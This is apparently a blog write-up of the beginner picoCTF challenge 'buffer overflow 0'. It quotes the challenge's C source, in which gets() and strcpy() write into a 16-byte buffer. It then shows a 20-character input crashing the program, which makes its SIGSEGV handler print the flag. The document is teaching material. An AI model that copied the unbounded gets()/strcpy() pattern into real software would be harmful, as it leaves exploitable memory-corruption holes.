<!--
---
slug: "picoctf-buffer-overflow-0"
title: "picoCTF — buffer overflow 0"
date: "2025-06-23"
ctf: "picoCTF"
challenge: "buffer overflow 0"
difficulty: "beginner"
tags: ["buffer overflow", "stack"]
summary: "A walkthrough of a classic stack-based buffer overflow — overwriting adjacent stack memory to trigger a win condition."
---
-->

# picoCTF — buffer overflow 0

## Overview

| Field | Detail |
|-------|--------|
| CTF | picoCTF |
| Category | PWN |
| Difficulty | Beginner |
| Topics | Stack buffer overflow |

---

## Reading the Source

The source code in C is provided. The first step is understanding what the program is.

First off, within the `main` function, the program loads the values of the flag.txt file stored in the same directory into a `flag` variable.

```c
FILE *f = fopen("flag.txt","r");

if (f == NULL) {
printf("%s %s", "Please create 'flag.txt' in this directory with your",
                "own debugging flag.\n");
exit(0);
}

fgets(flag,FLAGSIZE_MAX,f);
```

Next, the program sets up a signal to run the `sigsegv_handler` function when the program touches memory it is not supposed to (SIGSEGV).

```c
signal(SIGSEGV, sigsegv_handler);
```

The `sigsegv_handler` function prints the flag value directly.

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

This showed me the goal of the challenge: Simply raise a SIGSEGV error by touching memory that I am not supposed to.

From here, I found this was possible in the conveniently named `vuln` function which copies its input into a 16-byte buffer with no bounds checking, which would allow for a buffer overflow to overwrite the return address if the input is greater than 15 characters (16 minus the trailing null byte) plus the 4 byte (x86) pointer value that sits between the buffer and the return address.

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

Back in the `main` function, the program takes an input from the user, stores that input in a 100 byte buffer, and passes it to the `vuln` function.

```c
printf("Input: ");
fflush(stdout);
char buf1[100];
gets(buf1); 
vuln(buf1);
```

This means that, if this input is greater than 19 characters, it will overflow the buffer inside the `vuln` function raising a SIGSEGV error by overwriting the return address and printing the flag.

---

## Running the Binary.

To run this binary and execute this buffer overflow, I first had to create a `flag.txt` file within the same directory.

```
$ touch flag.txt
$ echo "FLAG{abcdef}" > flag.txt
```

From there, when executing the binary I was prompted for an input.

```
$ ./vuln
Input: 
```

With an input of 19 characters, the program ran as expected.

```
$ ./vuln
Input: abcdefghijklmnopqrs
The program will exit now
```

After inputting a string longer than 19 characters, my flag was printed.

```
$ ./vuln
Input: abcdefghijklmnopqrst
FLAG{abcdef}
```

---

## What I Learned

- **Stack layout on x86.** The buffer is followed by 4 bytes of saved registers/pointers, then the saved return address. Knowing that ordering and how many bytes each contains is what tells you how many bytes of input it takes to reach and overwrite the return address (16 + 4 = 20 here).
- **Vulnerable C functions.** Both `gets()` and `strcpy()` copy without checking the destination size. `gets()` reads arbitrary-length input into a fixed buffer, and `strcpy()` copies until a null byte regardless of how big the destination is.

---

## References

- [picoCTF - buffer overflow 0](https://learn.cylabacademy.org/library/257?page=1&workspace=true)
- [Smashing The Stack For Fun And Profit](https://inst.eecs.berkeley.edu/~cs161/archive/fa08/papers/stack_smashing.pdf)
    - Learning about stack layouts in x86, specifically the pointer bytes that sit between the buffer and the return address.
- [Common C Code Vulnerabilities and Mitigations](https://int0x33.medium.com/day-49-common-c-code-vulnerabilities-and-mitigations-7eded437ca4a)
    - Learning about `gets()` and `strcpy()` as common vulnerabilities due to them not checking destination size.